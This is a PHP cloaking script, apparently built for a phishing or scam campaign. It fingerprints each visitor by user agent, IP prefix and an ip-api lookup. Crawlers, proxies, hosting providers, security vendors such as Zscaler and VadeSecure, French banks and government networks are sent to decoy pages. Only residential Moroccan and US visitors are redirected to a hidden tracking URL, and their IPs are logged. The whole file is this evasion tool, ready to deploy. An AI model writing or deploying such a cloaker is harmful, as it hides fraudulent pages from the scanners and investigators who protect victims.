<?php
session_start();

// =====================
// TIME SETTINGS
// =====================
date_default_timezone_set('Europe/Paris');

// =====================
// CONFIG
// =====================
$user_url = "https://www.aucsite.com/27X9TTQ2/7MHZBPX7/?creative_id=14580";

// =====================
// TARGET COUNTRIES (MA, US)
// =====================
$allowed_countries = ['MA', 'US'];

// =====================
// BLACKLISTS (ISPs)
// =====================
$black_list = [
    "Microsoft Corp", "Microsoft Corporation", "Quality Technology", "U.s.next", "Longwood Medical", "Fastly", "Code 200", 
    "Netease", "Snmp Research", "Ifworld", "Royell Communications", "Penteledata", 
    "Level 3 Parent", "Oakland Schools", "Smithville Digital", "Cleardocks", "Indonesia Online", 
    "Apple", "Zoho", "Leaseweb", "OVH", "CompleTel", "Ozone", "Herault", "Supernet", 
    "Interveille", "hosting", "VIALIS", "LINKSIP", "SAEM", "GTT", "TELOISE", "Nexeon", 
    "Commerciale", "CRIHAN", "ICAUNAISE", "COOPERATIVE", "NORDNET-EXT", "INFOMIL-CLTPARIS", 
    "NORDNET", "Technologies", "cloud", "Knet", "Systeme", "Telia", "EI-TELECOM", 
    "Interministerielle", "Security", "Metropole", "GALIANA", "CNAMTS", "Alcatraz", 
    "Adista", "KEYYO", "Teranet", "OpenIP-Network", "CEGETEL", "DISIC-RIE", "M247", 
    "ALTSYSNET-OCCITANET5G", "Google", "UNIMEDIA-SERVICES", "Cogent", "Netprotect", 
    "velia.net", "NATIXIS", "Electricite", "Hub", "Labs", "Lyre", "Serveurcom", 
    "Rezopole", "Appliwave", "Epargne", "Anexia", "Caisse", "Sewan", "Reunicable", 
    "Axione", "Scalair", "Colt", "epargne", "caisse", "Poste", "Nerim", "Choopa", 
    "SPIE", "Paritel", "Microsoft", "DATACENTER", "Layer", "ZSCALER", "Coaxis", 
    "Firewall", "RENATER", "Online", "Traitement", "Dedicated", "Owentis", "Coriolis", 
    "Zscaler", "OZN", "CNCA", "Jaguar", "Vultr", "Holdings", "LLC", "NSC-SOLUTIONS", 
    "Backbone", "VadeSecure", "Datacamp", "Momax", "Mutuel", "FIMATEX", "NEO", "Credit", 
    "Agricole", "PSINet", "Skylogic", "Herault-networks", "Alliance", "Connectic", 
    "MYSTREAM", "Amazon", "GROUPAMA", "IRIS64", "Francaise", "Opentransit", 
    "Radiotelephone", "BPCE", "Rezocean", "K-net", "SCALEWAY", "Brutele", "YouSee", 
    "DigitalOcean", "Linode", "Hetzner", "CenturyLink", "Host Depot", "Zayo", "Akamai"
];

$block_list = [
    // Microsoft Corp & Datacenter Ranges men l-log
    "72.153.",    // Microsoft Corp / CA Proxy Range
    "72.145.",    // Microsoft Corp / IE Range
    "204.193.",   // Quality Technology Services
    "144.208.",   // U.s.next Inc
    "134.174.",   // Longwood Medical
    "216.98.",    // Ifworld Inc
    "103.4.",     // Code 200 Uab
    "103.129.",   // Netease HK
    "135.232.",   // Microsoft Limited
    "136.143.",   // Zoho
    "142.91.",    // Leaseweb
    "208.80.",    // Royell Comm
    "12.182.",    // AT&T Automated Scraper Range
    "74.202.",    // Level 3
    "204.186.",   // Penteledata
    "2a04:4e41:", // Fastly IPv6 Bot Range
    "17.",        // Apple Inc
    "35.91.",     // Amazon Technologies
    "54.149.",    // Amazon Technologies
    "72.152.",    // Microsoft
    "82.22.",     // Internet Utilities
    "192.147.",   // Snmp Research
    "128.119.",
    "128.8.",
    "216.11.",
    "134.199.", "172.68.", "172.69.", "172.70.", "172.71.", "162.158.", "108.162.", "172.64.", "141.101.", "104.16.", "104.17.", "104.18.", "104.19.",
    "193.56.2", "92.147.12.196", "194.78", "37.201.192.242", "79.166.147.44", "85.73.24.124", "5.203.224.203", "176.167.97.91", "176.176.30", "194.206", "185.", "176.149.93", "82.120.84", "94.143.176", "185.228.2", "176.148.157", "193.57", "89.210.43.74", "62.74.15.205", "2.10.4", "92.184", "109.221", "81.169.144", "141.38.12", "94.100.133.41", "141.38.1", "212.11.224", "212.11.225", "79.141.36.131"
];

// =====================
// GET REAL IP
// =====================
if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]);
} else {
    $ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
}

$now_time = time();
$now = date('Y-m-d h:i:sa');

// =====================
// ANTI-DUPLICATE / RATE LIMIT (3 SECONDS)
// =====================
if (isset($_SESSION['last_request_ip']) && $_SESSION['last_request_ip'] === $ip) {
    if (isset($_SESSION['last_request_time']) && ($now_time - $_SESSION['last_request_time']) < 3) {
        log_event($ip, 'XX', 'Flood/Duplicate Rate', 'Blocked Rapid Clicks (<3s)', 'red', $now);
        include_if_exists("./indexx.html");
        exit();
    }
}
$_SESSION['last_request_ip'] = $ip;
$_SESSION['last_request_time'] = $now_time;

// =====================
// USER AGENT / BOT FILTER
// =====================
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';

if (empty($user_agent) || $user_agent === '-' || strlen($user_agent) < 10) {
    log_event($ip, 'XX', 'Empty/Short User-Agent', 'Blocked Bot/UA', 'red', $now);
    include_if_exists("./indexx.html");
    exit();
}

$bad_agents = ['bot', 'crawl', 'spider', 'slurp', 'facebook', 'python', 'curl', 'wget', 'headless', 'phantom', 'selenium', 'puppeteer', 'microsoft'];
foreach ($bad_agents as $agent) {
    if (stripos($user_agent, $agent) !== false) {
        log_event($ip, 'XX', 'Bad User-Agent', 'Blocked Bot/UA', 'red', $now);
        include_if_exists("./indexx.html");
        exit();
    }
}

// =====================
// IP BLOCK LIST CHECK (BEFORE API)
// =====================
foreach ($block_list as $prefix) {
    if (strpos($ip, $prefix) === 0) {
        log_event($ip, 'XX', 'Cloudflare/Blocked Range', 'Blocked IP Range', 'red', $now);
        include_if_exists("./indexx.html");
        exit();
    }
}

// =====================
// GET GEO & PROXY DATA
// =====================
$api_url = "http://ip-api.com/json/{$ip}?fields=status,countryCode,isp,hosting,proxy";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $api_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 3);
$response = curl_exec($ch);
curl_close($ch);

$query = @json_decode($response, true);

// IṢLĀḤ: Ilā fṣal l-API awla 3ṭa error, ma-i-dūzsh l-user_url, kay-it-bloqa f-indexo.html
if (!$query || ($query['status'] ?? '') !== 'success') {
    log_event($ip, 'XX', 'API Timeout/Failure', 'Blocked API Fallback', 'red', $now);
    include_if_exists("./indexo.html");
    exit();
}

$country = $query['countryCode'] ?? 'XX';
$isp = $query['isp'] ?? 'Unknown';
$is_hosting = $query['hosting'] ?? false;
$is_proxy = $query['proxy'] ?? false;

// =====================
// BLOCK ALL PROXY / HOSTING / VPN
// =====================
if ($is_proxy || $is_hosting) {
    log_event($ip, $country, $isp, 'Blocked Proxy/Hosting', 'red', $now);
    include_if_exists("./indexx.html");
    exit();
}

// =====================
// COUNTRY CHECK (AT, DE, MA, CH ONLY)
// =====================
if (!in_array($country, $allowed_countries)) {
    log_event($ip, $country, $isp, 'Blocked Country', 'red', $now);
    include_if_exists("./indexo.html");
    exit();
}

// =====================
// ISP BLACKLIST
// =====================
foreach ($black_list as $item) {
    if (stripos($isp, $item) !== false) {
        log_event($ip, $country, $isp, 'Blacklisted ISP', 'red', $now);
        include_if_exists("./indexx.html");
        exit();
    }
}

// =====================
// ALLOWED
// =====================
log_event($ip, $country, $isp, 'Allowed', 'green', $now);

if (!isset($_SESSION['logged'])) {
    @file_put_contents("./allow.txt", $ip . PHP_EOL, FILE_APPEND);
    $_SESSION['logged'] = true;
}

header("Location: $user_url", true, 302);
exit();

// =====================
// HELPER FUNCTIONS
// =====================
function include_if_exists($file) {
    if (file_exists($file)) {
        include($file);
    } else {
        header("Location: https://www.bing.com", true, 302);
    }
}

function log_event($ip, $country, $isp, $status, $color, $now) {
    $html = "<table>
        <tr>
            <td style='color:$color;'>$ip</td>
            <td style='color:$color;'>$country</td>
            <td style='color:$color;'>$isp</td>
            <td style='color:$color;'>$status</td>
            <td style='color:$color;'>$now</td>
        </tr>
    </table>";

    @file_put_contents("./log.htm", $html, FILE_APPEND);
}